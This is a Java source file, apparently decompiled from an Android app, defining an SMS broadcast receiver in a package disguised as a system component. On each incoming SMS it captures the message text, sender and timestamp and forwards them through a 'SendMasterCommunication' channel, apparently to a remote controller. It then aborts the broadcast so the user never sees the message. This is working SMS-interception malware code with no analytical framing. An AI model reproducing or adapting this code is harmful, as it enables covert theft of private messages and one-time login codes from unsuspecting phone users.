package com.android.engine.receivers;

import Transfer.Action;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.telephony.SmsMessage;
import com.android.engine.SendMasterCommunication;
import com.android.engine.ExceptionAction;

public class SMSReceiver extends BroadcastReceiver {

  public void onReceive(Context context, Intent intent) {
    try {
      if (VERSION.SDK_INT >= 4) {
        SmsMessage createFromPdu =
            SmsMessage.createFromPdu((byte[]) ((Object[]) intent.getExtras().get("pdus"))[0]);
        Action action = new Action();
        action.ACTION = 73;
        action.DATA = new String[] {
            createFromPdu.getDisplayMessageBody(), createFromPdu.getDisplayOriginatingAddress(),
            String.valueOf(createFromPdu.getTimestampMillis())
        };
        SendMasterCommunication.sendAction(action);

        setResultData(null);
        abortBroadcast();
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
